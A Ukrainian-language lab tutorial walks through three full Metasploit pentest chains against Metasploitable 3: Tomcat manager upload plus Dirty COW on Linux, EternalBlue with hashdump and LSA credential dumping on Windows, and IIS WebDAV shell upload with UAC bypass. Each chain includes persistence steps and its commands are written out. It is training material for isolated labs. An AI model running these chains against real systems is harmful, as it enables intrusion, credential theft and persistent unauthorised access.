# Навчальні сценарії повного циклу пентесту в лабораторії.

Орієнтуємося на:

* атакувальна машина — Kali Linux
* інструмент — Metasploit Framework
* ціль — Metasploitable 3
* формат — повний цикл:
  Recon → Enumeration → Exploitation → Post-Exploitation → Persistence → Reporting

Сценарії навчальні, для ізольованої лабораторії.

# Практична та методична цінність матеріалу:

Для формату Advanced-курсу:

| Сценарій     | Навичка            |
| ------------ | ------------------ |
| Linux Tomcat | Web RCE + LPE      |
| Windows SMB  | Мережевий експлойт |
| Windows IIS  | Web + LPE chain    |

Це покриває:

* мережевий пентест
* вебпентест
* privilege escalation
* persistence
* credential harvesting
* побудову kill chain


---

# Сценарій 1 — Metasploitable3 Linux

**Тема:** RCE через вебзастосунок → привілеї root

---

## 1️⃣ Recon

```bash
nmap -sC -sV -p- 192.168.56.110
```

Виявляємо:

* 22/tcp (SSH)
* 80/tcp (Apache)
* 8180/tcp (Tomcat)
* потенційно вразливі сервіси

---

## 2️⃣ Enumeration (через Metasploit)

```bash
msfconsole
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/tomcat_mgr_login
```

Виявляємо слабкі облікові дані Tomcat.

---

## 3️⃣ Exploitation

Якщо знайдено доступ до Tomcat Manager:

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.56.110
set HttpUsername tomcat
set HttpPassword tomcat
set PAYLOAD java/meterpreter/reverse_tcp
run
```

Отримуємо meterpreter-сесію.

---

## 4️⃣ Post-Exploitation

```bash
sysinfo
getuid
```

Якщо не root — перевіряємо:

```bash
use post/linux/gather/enum_configs
```

Шукаємо:

* SUID-бінарники
* слабкі sudoers
* помилки в cron

Можна перейти до локального експлойту:

```bash
use exploit/linux/local/dirty_cow
```

(у навчальній версії VM ця вразливість зазвичай присутня)

---

## 5️⃣ Privilege Escalation

Після запуску:

```bash
getuid
```

→ root

---

## 6️⃣ Persistence

```bash
use post/linux/manage/sshkey_persistence
```

---

## 7️⃣ Звіт

У звіті фіксуємо:

* вразливість слабких облікових даних
* RCE через Tomcat
* LPE через Dirty COW
* повну компрометацію сервера

---

# Сценарій 2 — Metasploitable3 Windows

**Тема:** EternalBlue → SYSTEM → Dump Credentials

---

## 1️⃣ Recon

```bash
nmap -p445 -sV 192.168.56.120
```

SMB відкритий.

---

## 2️⃣ Перевірка вразливості

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Якщо vulnerable → продовжуємо.

---

## 3️⃣ Exploitation

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.120
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

Отримуємо SYSTEM shell.

---

## 4️⃣ Post-Exploitation

```bash
hashdump
```

або:

```bash
use post/windows/gather/credentials/lsa_dump
```

Збираємо:

* NTLM-хеші
* локальних користувачів

---

## 5️⃣ Аналіз привілеїв

Перевіряємо токени:

```bash
getsystem
```

---

## 6️⃣ Persistence

```bash
use post/windows/manage/persistence_exe
```

---

## 7️⃣ Звіт

Критична вразливість:

* MS17-010
* віддалене виконання коду
* повний контроль над системою
* компрометація облікових даних

---

# Сценарій 3 — Metasploitable3 Windows

**Тема:** IIS + WebDAV → Upload Shell → LPE

---

## 1️⃣ Recon

```bash
nmap -sC -sV 192.168.56.120
```

Знаходимо:

* 80/tcp IIS
* WebDAV увімкнений

---

## 2️⃣ Enumeration

```bash
use auxiliary/scanner/http/iis_webdav_scanner
```

Виявляємо можливість PUT.

---

## 3️⃣ Exploitation

```bash
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS 192.168.56.120
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

Отримуємо доступ від імені IIS.

---

## 4️⃣ Post-Exploitation

```bash
getuid
```

Зазвичай:

```
IIS APPPOOL\DefaultAppPool
```

---

## 5️⃣ Privilege Escalation

Шукаємо LPE:

```bash
use post/windows/gather/enum_privs
```

Далі можливий варіант:

```bash
use exploit/windows/local/bypassuac
```

або:

```bash
use exploit/windows/local/tokenmagic
```

---

## 6️⃣ SYSTEM Access

```bash
getsystem
```

---

## 7️⃣ Додатковий навчальний етап

Pivoting:

```bash
route add
```

Для моделювання lateral movement.